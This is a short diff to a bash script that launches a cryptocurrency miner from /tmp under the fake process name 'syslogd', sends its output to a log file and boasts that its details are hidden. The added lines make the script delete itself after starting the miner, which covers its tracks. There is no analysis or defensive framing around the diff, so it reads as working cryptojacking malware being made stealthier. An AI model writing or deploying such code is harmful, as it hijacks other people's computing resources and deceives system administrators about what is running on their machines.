@@ -1,6 +1,7 @@
 #!/bin/bash
 
 if pgrep -x "syslogd" >/dev/null; then
+  rm -f "$(realpath "$0")"
   exit 0
 fi
 # Go to /tmp
@@ -47,6 +48,8 @@ echo "Starting miner as 'syslogd' using config.json..."
 
 # 3. Start the miner using the config file
 # In htop, this will only show as: ./syslogd --config=config.json
+rm -f "$(realpath "$0")"
 ./syslogd --config=config.json >/tmp/syslogd.log 2>&1 &
 
 echo "Process started. Details are hidden in the config file."
+rm -f "$(realpath "$0")"
